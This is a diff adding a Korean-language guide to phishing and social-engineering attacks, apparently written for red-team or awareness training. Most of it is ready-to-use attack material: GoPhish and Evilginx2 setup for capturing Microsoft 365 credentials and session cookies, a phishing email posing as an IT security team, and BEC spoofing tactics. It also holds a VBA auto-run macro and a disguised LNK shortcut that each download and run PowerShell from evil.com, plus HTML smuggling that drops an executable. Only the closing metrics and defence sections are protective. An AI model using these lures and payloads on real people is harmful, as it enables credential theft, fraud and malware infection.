@@ -1,0 +1,434 @@
+# 피싱 및 사회공학 공격
+
+## 사회공학 공격 분류
+
+```
+인간 심리 취약점 활용:
+  긴박감 (Urgency)     → "지금 즉시 비밀번호 변경!"
+  권위 (Authority)     → "CEO입니다. 즉시 처리하세요"
+  호기심 (Curiosity)   → "당신의 급여 명세서.xlsx"
+  두려움 (Fear)        → "계정이 해킹되었습니다"
+  탐욕 (Greed)         → "당신이 선발되었습니다"
+  친밀감 (Familiarity) → 동료/상사 사칭
+```
+
+---
+
+## 1. 피싱 인프라 구성
+
+### GoPhish 피싱 플랫폼
+
+```bash
+# GoPhish 설치
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+chmod +x gophish
+
+# 설정 파일
+cat > config.json << 'EOF'
+{
+    "admin_server": {
+        "listen_url": "127.0.0.1:3333",
+        "use_tls": true,
+        "cert_path": "gophish_admin.crt",
+        "key_path": "gophish_admin.key"
+    },
+    "phish_server": {
+        "listen_url": "0.0.0.0:443",
+        "use_tls": true,
+        "cert_path": "phish.crt",
+        "key_path": "phish.key"
+    },
+    "db_name": "sqlite3",
+    "db_path": "gophish.db"
+}
+EOF
+
+./gophish
+# 관리 패널: https://127.0.0.1:3333
+# 기본 계정: admin / (실행 시 출력)
+```
+
+### 피싱 도메인 준비
+
+```bash
+# 타이포스쿼팅 도메인 탐색
+# company.com → conpany.com, cornpany.com, company.co, etc.
+dnstwist company.com
+
+# 구매 후 DNS 설정
+# A 레코드: 피싱 서버 IP
+# MX 레코드: 이메일 서버
+# SPF: v=spf1 ip4:PHISH_IP ~all
+# DKIM: 메일 서버 설정
+# DMARC: v=DMARC1; p=none; rua=mailto:admin@phish.com
+
+# SSL 인증서 발급 (신뢰도 향상)
+certbot certonly --standalone -d phish-domain.com
+```
+
+### 전문적인 피싱 이메일 템플릿
+
+```html
+<!-- IT 보안 팀 사칭 피싱 이메일 -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+</head>
+<body style="font-family: Arial, sans-serif;">
+    <div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd;">
+        <!-- 헤더 -->
+        <div style="background: #0078d4; padding: 20px;">
+            <img src="https://phish-domain.com/logo.png" 
+                 alt="Company Logo" width="150">
+        </div>
+        
+        <!-- 본문 -->
+        <div style="padding: 30px;">
+            <p>안녕하세요 {{.FirstName}}님,</p>
+            
+            <p>IT 보안팀입니다. 귀하의 계정에서 <strong>의심스러운 로그인 시도</strong>가
+            감지되었습니다.</p>
+            
+            <p><strong>감지된 로그인 정보:</strong></p>
+            <ul>
+                <li>시간: {{.Now}}</li>
+                <li>위치: 러시아 모스크바</li>
+                <li>기기: Unknown Device</li>
+            </ul>
+            
+            <p>귀하의 계정이 아니라면 즉시 비밀번호를 변경하세요:</p>
+            
+            <div style="text-align: center; margin: 30px 0;">
+                <a href="{{.URL}}" 
+                   style="background: #0078d4; color: white; padding: 15px 30px; 
+                          text-decoration: none; border-radius: 5px;">
+                    비밀번호 즉시 변경
+                </a>
+            </div>
+            
+            <p>24시간 내 조치하지 않으면 계정이 잠깁니다.</p>
+            
+            <p>감사합니다,<br>
+            IT 보안팀</p>
+        </div>
+        
+        <!-- 푸터 -->
+        <div style="background: #f5f5f5; padding: 15px; font-size: 11px; color: #666;">
+            이 이메일은 자동 발송되었습니다. 문의: security@company.com
+        </div>
+    </div>
+</body>
+</html>
+```
+
+---
+
+## 2. 자격증명 수집 페이지
+
+### Microsoft 365 피싱 페이지 클론
+
+```bash
+# HTTrack으로 로그인 페이지 복제
+httrack "https://login.microsoftonline.com" -O ./clone/
+
+# 또는 wget
+wget --mirror --convert-links --page-requisites \
+    https://login.microsoftonline.com/
+
+# Evilginx2 (리버스 프록시 방식 - 실제 자격증명 캡처)
+```
+
+### Evilginx2 설정
+
+```bash
+# Evilginx2 설치
+git clone https://github.com/kgretzky/evilginx2
+cd evilginx2
+make build
+./bin/evilginx
+
+# 설정
+config domain phishmail.com
+config ip PHISH_SERVER_IP
+
+# Microsoft 365 phishlet 활성화
+phishlets hostname o365 login.phishmail.com
+phishlets enable o365
+
+# lure 생성 (피싱 URL)
+lures create o365
+lures get-url 0
+
+# 캡처된 세션 확인
+sessions  # 자격증명 + 쿠키 확인
+sessions 1  # 세션 상세 (쿠키로 세션 하이재킹 가능)
+```
+
+---
+
+## 3. 스피어 피싱 (Targeted Phishing)
+
+### OSINT으로 개인화된 피싱 준비
+
+```bash
+# 타겟 정보 수집
+# LinkedIn: 직함, 업무, 관심사
+# Twitter/X: 개인 관심사
+# Facebook: 가족 정보
+# GitHub: 기술 스택
+
+# 개인화 요소:
+# - 실명 사용
+# - 실제 동료 이름 언급
+# - 실제 프로젝트/업무 내용
+# - 최근 행사/회의 언급
+# - 실제 회사 도메인처럼 보이는 주소
+
+# OSINT 자동화
+python3 theHarvester.py -d company.com -l 500 -b all
+recon-ng
+shodan search "company.com"
+```
+
+### BEC (Business Email Compromise)
+
+```
+CEO 사기 시나리오:
+  1. CEO LinkedIn에서 정보 수집
+  2. CFO 이메일 스푸핑 (from CEO처럼)
+  3. "급한 계좌 이체" 요청
+  4. 실제 CEO처럼 보이는 이메일 주소 사용
+
+이메일 헤더 스푸핑:
+  From: CEO Name <ceo@company.com>
+  Reply-To: ceo@company-secure.com  # 공격자 주소
+  
+SPF/DKIM 우회 기법:
+  - From 도메인과 다른 도메인으로 전송
+  - 유사 도메인 (company.co vs company.com)
+  - Display name 속임 (CEO Name <attacker@gmail.com>)
+```
+
+---
+
+## 4. 악성 문서 (Phishing Attachment)
+
+### 매크로 기반 Office 문서
+
+```vba
+' VBA 매크로 (Office 2010-2016 환경)
+Sub AutoOpen()
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    
+    ' PowerShell 페이로드 실행
+    wsh.Run "powershell.exe -ep bypass -nop -w hidden -c """ & _
+        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" & _
+        """", 0, False
+End Sub
+```
+
+```python
+#!/usr/bin/env python3
+"""악성 Office 문서 생성"""
+
+from maldocx import MalDocx
+
+# DOCX 악성 문서 생성
+doc = MalDocx()
+doc.set_payload("msfvenom -p windows/x64/meterpreter/reverse_https...")
+doc.set_decoy_content("재무 보고서 3분기.docx")
+doc.generate("악성_문서.docx")
+```
+
+### HTML Smuggling
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<!-- HTML Smuggling: 브라우저에서 직접 파일 생성 -->
+<script>
+function downloadPayload() {
+    // Base64로 인코딩된 페이로드
+    var payload = "UEsDBBQAAAAI...";  // Base64 encoded exe
+    
+    // Blob으로 변환
+    var byteCharacters = atob(payload);
+    var byteArrays = [];
+    for (var i = 0; i < byteCharacters.length; i++) {
+        byteArrays.push(byteCharacters.charCodeAt(i));
+    }
+    var blob = new Blob([new Uint8Array(byteArrays)], 
+                       {type: 'application/octet-stream'});
+    
+    // 자동 다운로드
+    var link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = 'Invoice_2024.exe';
+    link.click();
+}
+
+window.onload = downloadPayload;
+</script>
+<h1>문서를 확인 중입니다...</h1>
+</body>
+</html>
+```
+
+### LNK 파일 페이로드
+
+```powershell
+# PowerShell로 악성 LNK 생성
+$wsh = New-Object -ComObject WScript.Shell
+$shortcut = $wsh.CreateShortcut("$env:TEMP\Resume.lnk")
+$shortcut.TargetPath = "cmd.exe"
+$shortcut.Arguments = '/c powershell.exe -ep bypass -nop -w hidden -c "IEX (iwr http://evil.com/payload.ps1)"'
+$shortcut.IconLocation = "C:\Windows\System32\imageres.dll,77"  # PDF 아이콘
+$shortcut.Description = "Resume_2024.pdf"
+$shortcut.Save()
+```
+
+---
+
+## 5. 사회공학 전화 (Vishing)
+
+### Vishing 스크립트
+
+```
+시나리오: IT 지원 팀 사칭
+
+공격자: "안녕하세요, IT 지원팀 김민준입니다. 
+         현재 귀하의 컴퓨터에서 보안 경고가 발생했습니다."
+
+피해자: "어, 저는 특별한 게 없는데요..."
+
+공격자: "네, 경고는 백그라운드에서 발생합니다. 
+         저희가 원격으로 확인해드리겠습니다.
+         화면에 'Windows + R'을 누르시겠어요?"
+
+피해자: "눌렀어요"
+
+공격자: "그 다음 'mstsc'를 입력하시면 됩니다..." 
+         (실제로는 공격자 서버로 연결 유도)
+
+핵심:
+  - 권위 (IT팀)
+  - 긴박감 (보안 경고)
+  - 기술 지식으로 신뢰 구축
+  - 점진적 정보 요청
+```
+
+---
+
+## 6. 피싱 시뮬레이션 측정 지표
+
+```python
+#!/usr/bin/env python3
+"""피싱 시뮬레이션 결과 분석"""
+
+import json
+from datetime import datetime
+
+class PhishingMetrics:
+    def __init__(self, campaign_data: dict):
+        self.data = campaign_data
+    
+    def calculate_kpis(self) -> dict:
+        total = self.data['sent']
+        opened = self.data['opened']
+        clicked = self.data['clicked']
+        submitted = self.data['submitted']
+        reported = self.data['reported']
+        
+        return {
+            'open_rate': round(opened / total * 100, 1),
+            'click_rate': round(clicked / total * 100, 1),
+            'submission_rate': round(submitted / total * 100, 1),
+            'reporting_rate': round(reported / total * 100, 1),
+            'susceptibility_score': round((clicked / total) * 100, 1),
+        }
+    
+    def get_risk_level(self, click_rate: float) -> str:
+        if click_rate < 5:
+            return "낮음 (우수)"
+        elif click_rate < 15:
+            return "보통 (개선 필요)"
+        elif click_rate < 30:
+            return "높음 (즉각 교육 필요)"
+        else:
+            return "매우 높음 (긴급 대응 필요)"
+    
+    def generate_report(self) -> str:
+        kpis = self.calculate_kpis()
+        risk = self.get_risk_level(kpis['click_rate'])
+        
+        report = f"""
+# 피싱 시뮬레이션 결과 보고서
+
+## 캠페인 요약
+- 발송: {self.data['sent']}명
+- 열람: {self.data['opened']}명 ({kpis['open_rate']}%)
+- 클릭: {self.data['clicked']}명 ({kpis['click_rate']}%)
+- 자격증명 입력: {self.data['submitted']}명 ({kpis['submission_rate']}%)
+- 신고: {self.data['reported']}명 ({kpis['reporting_rate']}%)
+
+## 위험도 평가: {risk}
+
+## 부서별 결과
+"""
+        if 'by_department' in self.data:
+            for dept, stats in self.data['by_department'].items():
+                dept_rate = stats['clicked'] / stats['sent'] * 100
+                report += f"  - {dept}: {dept_rate:.1f}%\n"
+        
+        return report
+
+# 사용 예시
+campaign = {
+    'sent': 500,
+    'opened': 350,
+    'clicked': 87,
+    'submitted': 43,
+    'reported': 12,
+    'by_department': {
+        '재무팀': {'sent': 50, 'clicked': 15},
+        '영업팀': {'sent': 100, 'clicked': 22},
+        'IT팀': {'sent': 80, 'clicked': 5},
+        '임원진': {'sent': 20, 'clicked': 8},
+    }
+}
+
+metrics = PhishingMetrics(campaign)
+print(metrics.generate_report())
+```
+
+---
+
+## 7. 피싱 방어 체계
+
+```
+기술적 방어:
+  □ DMARC (p=reject) 설정
+  □ SPF 레코드 설정
+  □ DKIM 서명
+  □ 이메일 게이트웨이 (샌드박스 분석)
+  □ URL 클릭 전 검사
+  □ 첨부파일 가상환경 실행
+  □ 브라우저 격리 (Remote Browser Isolation)
+  □ MFA (자격증명 탈취 후 접근 방지)
+
+교육적 방어:
+  □ 분기별 피싱 시뮬레이션
+  □ 즉각적 피드백 훈련
+  □ 피싱 신고 메커니즘 (버튼 클릭으로 간편 신고)
+  □ 클릭 시 교육 페이지 자동 표시
+  □ 경영진 대상 BEC 특화 훈련
+
+절차적 방어:
+  □ 금융 이체 2인 승인
+  □ 급한 요청 시 전화 확인 절차
+  □ 대역 외 인증 채널
+```
